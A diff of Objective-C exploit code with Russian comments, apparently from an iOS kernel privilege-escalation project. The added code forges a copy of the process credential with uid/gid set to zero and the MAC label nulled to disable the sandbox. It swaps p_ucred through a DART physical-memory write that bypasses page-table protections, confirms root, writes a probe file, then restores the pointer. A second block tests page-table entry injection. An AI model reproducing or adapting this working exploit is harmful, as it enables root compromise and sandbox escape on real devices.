@@ -8070,63 +8070,85 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     // fk НЕ освобождаем (сознательный leak — ucredVA указывает на неё)
                     (void)fk;
                 }
-                // 1.9.277 (р.70 Q2/Q3): ucredPA без deadly-чтений и без TLB.
-                // [FRESH-A] инжекция PTE в СВЕЖИЙ (invalid) слот НЕdeadly L3-таблицы
-                // нашего proc (walker по selfProcM дошёл до leaf = её фрейм читается
-                // phystokv — доказано pteSrc в 276). У свежего VA нет TLB-записи —
-                // kread сразу видит цель. Цель = ctlPA (маркер 0xCAFEBABE): сошёлся =
-                // DART-запись в табличный фрейм ЛОЖИТСЯ (иначе — молчаливая дроп SPTM).
-                // [FRESH-B] второй свежий слот → PA deadly-таблицы ucred (маппим её
-                // как data): читаем настоящий leaf PTE → ucredPA → контент-форж ниже.
-                if (!pagePA && kp_lastDeadlyTte && isTable && svc && ttM && selfProcM && ctlPA) {
-                    uint64_t svTte = kp_lastDeadlyTte; int svLvl = kp_lastDeadlyLvl;   // selfproc-walk перезаписывает их
-                    uint64_t lvlS = 3, ltS = 0;
-                    uint64_t gpaS = vtophys_lvl(kconstant(cpuTTEP), kp_untag_ptr(selfProcM), &lvlS, &ltS);
-                    uint64_t l3tPA = ltS & ~0x3fffULL;
-                    uint64_t pteSrc = (gpaS && ltS && !kpFrameDeadly(ltS)) ? early_kread64(phystokv(ltS)) : 0;
-                    kp_lastDeadlyTte = svTte; kp_lastDeadlyLvl = svLvl;
-                    kpNote(r, [NSString stringWithFormat:@"  [FRESH] selfproc L3: walk=%@ tte=%#llx table=%#llx pteSrc=%#018llx",
-                              gpaS ? @"ok" : @"deadly", (unsigned long long)ltS, (unsigned long long)l3tPA, pteSrc]);
-                    if ((pteSrc & 0x3) == 0x3 && l3tPA) {
-                        uint64_t l3tKVA = phystokv(l3tPA);
-                        uint64_t l3baseVA = kp_untag_ptr(selfProcM) & ~0x1ffffffULL;   // 2048 слотов × 16K
-                        int freeIdx[2] = { -1, -1 };
-                        int nFree = 0;
-                        for (uint32_t i = 0; i < 2048 && nFree < 2; i++)
-                            if (early_kread64(l3tKVA + (uint64_t)i * 8) == 0) freeIdx[nFree++] = (int)i;
-                        kpNote(r, [NSString stringWithFormat:@"  [FRESH] invalid-слоты: #%d #%d (baseVA=%#llx)",
-                                  freeIdx[0], freeIdx[1], (unsigned long long)l3baseVA]);
-                        if (freeIdx[0] >= 0) {
-                            uint64_t slotVA_A = l3baseVA + (uint64_t)freeIdx[0] * 0x4000;
-                            uint64_t pteA = (ctlPA & 0x0000ffffffffc000ULL) | (pteSrc & ~0x0000ffffffffc000ULL);
-                            BOOL wA = kpPhysWrite8v2(svc, tsdV, ttM, isTable, l3tPA, (uint32_t)freeIdx[0] * 8, pteA, r);
-                            uint32_t probeA = (uint32_t)early_kread64(slotVA_A);
-                            BOOL aLands = (probeA == 0xCAFEBABE);
-                            kpNote(r, [NSString stringWithFormat:@"  [FRESH-A] L3[%d] VA=%#llx ← ctlPA — write=%@ probe=%#010x → %@",
-                                      freeIdx[0], (unsigned long long)slotVA_A, wA ? @"kr=0" : @"МИМО", probeA,
-                                      aLands ? @"ТАБЛИЧНАЯ ЗАПИСЬ ЛОЖИТСЯ ✓" : @"ДРОПАЕТСЯ (SPTM)"]);
-                            if (aLands && freeIdx[1] >= 0 && svLvl == 3) {
-                                uint64_t dT = svTte & ~0x3fffULL;
-                                uint32_t dOff = (uint32_t)(svTte & 0x3fff);
-                                uint64_t slotVA_B = l3baseVA + (uint64_t)freeIdx[1] * 0x4000;
-                                uint64_t pteB = (dT & 0x0000ffffffffc000ULL) | (pteSrc & ~0x0000ffffffffc000ULL);
-                                BOOL wB = kpPhysWrite8v2(svc, tsdV, ttM, isTable, l3tPA, (uint32_t)freeIdx[1] * 8, pteB, r);
-                                uint64_t leaf = early_kread64(slotVA_B + dOff);
-                                kpNote(r, [NSString stringWithFormat:@"  [FRESH-B] deadly-таблица %#llx как data: write=%@ leaf=%#018llx",
-                                          (unsigned long long)dT, wB ? @"kr=0" : @"МИМО", leaf]);
-                                if ((leaf & 0x3) == 0x3) {
-                                    uint64_t cand = leaf & 0x0000ffffffffc000ULL;
-                                    if (cand >= kconstant(physBase) && cand < kconstant(physBase) + kconstant(physSize)) {
-                                        pagePA = cand;
-                                        kpNote(r, [NSString stringWithFormat:@"  [FRESH-B] ★ ucredPA=%#llx — deadly-таблица читается как data! Контент-форж ниже.",
-                                                  (unsigned long long)pagePA]);
-                                    }
+                // 1.9.278 (р.70/71): ucredPA мёртв насовсем — pv для kernel_pmap не
+                // существует (pmap_enter_options skip @ 0x8155090), frame-table без
+                // back-pointer, CTRR фенсит ro_pagetables от DMA, blind-probe свежих
+                // kernel VA = паника в kernel-контексте (р.71 Q4). Выживший маршрут —
+                // P_UCRED SWAP через physmap-форж: поле в proc_ro читается (276), PA
+                // поля даёт walker (нашего proc таблицы недeadly — pteSrc читался).
+                // Форж = копия ucred на НАШЕЙ странице (uid/gid=0, label=NULL);
+                // p_ucred переписываем physmap-алиасом одним DART physwrite8.
+                // Никаких правок таблиц, TLB-игр и deadly-чтений.
+                {
+                    uint64_t ucFieldVA = roF + koffsetof(proc_ro, ucred);
+                    uint64_t lvlP = 3, ltP = 0;
+                    uint64_t ucFieldPA = vtophys_lvl(kconstant(cpuTTEP), ucFieldVA, &lvlP, &ltP);
+                    kpNote(r, [NSString stringWithFormat:@"  [PSWAP] p_ucred field: VA=%#llx PA=%#llx (walk %@)",
+                              (unsigned long long)ucFieldVA, (unsigned long long)ucFieldPA, ucFieldPA ? @"ok" : @"deadly — мимо"]);
+                    if (ucFieldPA && svc && ttM && isTable) {
+                        uint8_t *fp2 = valloc(0x4000);
+                        for (uint32_t i = 0; i < 0x100; i += 8) *(uint64_t *)(fp2 + i) = early_kread64(ucF + i);
+                        *(uint32_t *)(fp2 + 0x18) = 0;  // cr_uid
+                        *(uint32_t *)(fp2 + 0x1c) = 0;  // cr_ruid
+                        *(uint32_t *)(fp2 + 0x20) = 0;  // cr_svuid
+                        *(uint32_t *)(fp2 + 0x28) = 0;  // cr_groups[0]
+                        *(uint32_t *)(fp2 + 0x68) = 0;  // cr_rgid
+                        *(uint32_t *)(fp2 + 0x6c) = 0;  // cr_svgid
+                        *(uint64_t *)(fp2 + 0x78) = 0;  // cr_label = NULL → sandbox off
+                        mlock(fp2, 0x4000);
+                        uint64_t fpPA = vtophys(ttM, (uint64_t)fp2);
+                        uint64_t fpKVA = fpPA ? phystokv(fpPA) : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  [PSWAP] forge page: PA=%#llx KVA=%#llx",
+                                  (unsigned long long)fpPA, (unsigned long long)fpKVA]);
+                        if (fpKVA && kpLooksLikeKernelPointer(fpKVA)) {
+                            BOOL wP = kpPhysWrite8v2(svc, tsdV, ttM, isTable, ucFieldPA & ~0x3fffULL,
+                                                     (uint32_t)(ucFieldPA & 0x3fff), fpKVA, r);
+                            uint64_t rb = early_kread64(ucFieldVA);
+                            kpNote(r, [NSString stringWithFormat:@"  [PSWAP] запись=%@ readback=%#llx (ждём %#llx) → %@",
+                                      wP ? @"kr=0" : @"МИМО", (unsigned long long)rb, (unsigned long long)fpKVA,
+                                      rb == fpKVA ? @"P_UCRED ПЕРЕКЛЮЧЁН ✓" : @"НЕ ПРИЛИПЛО"]);
+                            if (rb == fpKVA) {
+                                uid_t gu = getuid(); gid_t gg = getgid();
+                                kpNote(r, [NSString stringWithFormat:@"  [PSWAP] getuid()=%u getgid()=%u", gu, gg]);
+                                if (gu == 0) {
+                                    kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — p_ucred swap через DART physwrite (physmap-форж, мимо SPTM RO) ===");
+                                    FILE *fpf = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                                    kpNote(r, [NSString stringWithFormat:@"  [PSWAP] sandbox-проба (запись в /var/mobile): %@",
+                                              fpf ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ"]);
+                                    if (fpf) { fputs("root via p_ucred swap\n", fpf); fclose(fpf); }
                                 }
-                                kpPhysWrite8v2(svc, tsdV, ttM, isTable, l3tPA, (uint32_t)freeIdx[1] * 8, 0, r);   // restore слота B
-                            } else if (aLands) {
-                                kpNote(r, [NSString stringWithFormat:@"  [FRESH-B] пропуск: freeIdx[1]=%d svLvl=%d", freeIdx[1], svLvl]);
+                                usleep(1000000);   // секунда root-состояния на пробы
+                                kpPhysWrite8v2(svc, tsdV, ttM, isTable, ucFieldPA & ~0x3fffULL,
+                                               (uint32_t)(ucFieldPA & 0x3fff), ucF, r);   // restore оригинала
+                                kpNote(r, [NSString stringWithFormat:@"  [PSWAP] restore: readback=%#llx (ждём %#llx)",
+                                          (unsigned long long)early_kread64(ucFieldVA), (unsigned long long)ucF]);
                             }
-                            if (aLands) kpPhysWrite8v2(svc, tsdV, ttM, isTable, l3tPA, (uint32_t)freeIdx[0] * 8, 0, r);   // restore слота A
+                        }
+                        munlock(fp2, 0x4000); free(fp2);   // безопасно: p_ucred уже возвращён
+                    }
+                    // [TBL-TEST] р.71 Q3-residual: ложится ли DMA-запись в ДИНАМИЧЕСКУЮ
+                    // pmap-таблицу (пост-boot пул — может быть вне статического CTRR)?
+                    // PTE→ctlPA в invalid-слот L3 нашего proc; readback ТОЛЬКО через
+                    // phystokv-алиас таблицы (свежий VA НЕ пробуем — р.71 Q4: паника).
+                    {
+                        uint64_t lvlS = 3, ltS = 0;
+                        uint64_t gpaS = vtophys_lvl(kconstant(cpuTTEP), kp_untag_ptr(selfProcM), &lvlS, &ltS);
+                        uint64_t l3tPA = ltS & ~0x3fffULL;
+                        uint64_t pteSrc = (gpaS && ltS && !kpFrameDeadly(ltS)) ? early_kread64(phystokv(ltS)) : 0;
+                        if ((pteSrc & 0x3) == 0x3 && l3tPA && ctlPA && svc && ttM && isTable) {
+                            uint64_t l3tKVA = phystokv(l3tPA);
+                            int freeI = -1;
+                            for (uint32_t i = 0; i < 2048; i++)
+                                if (early_kread64(l3tKVA + (uint64_t)i * 8) == 0) { freeI = (int)i; break; }
+                            if (freeI >= 0) {
+                                uint64_t pteA = (ctlPA & 0x0000ffffffffc000ULL) | (pteSrc & ~0x0000ffffffffc000ULL);
+                                kpPhysWrite8v2(svc, tsdV, ttM, isTable, l3tPA, (uint32_t)freeI * 8, pteA, r);
+                                uint64_t rbS = early_kread64(l3tKVA + (uint64_t)freeI * 8);
+                                kpNote(r, [NSString stringWithFormat:@"  [TBL-TEST] L3[%d] нашего proc: readback=%#018llx (ждём %#018llx) → %@",
+                                          freeI, rbS, pteA, rbS == pteA ? @"ДИНАМИЧЕСКИЕ ТАБЛИЦЫ ПИШУТСЯ ✓" : @"ДРОП (CTRR фенсит и их)"]);
+                                if (rbS == pteA)
+                                    kpPhysWrite8v2(svc, tsdV, ttM, isTable, l3tPA, (uint32_t)freeI * 8, 0, r);   // restore
+                            }
                         }
                     }
                 }
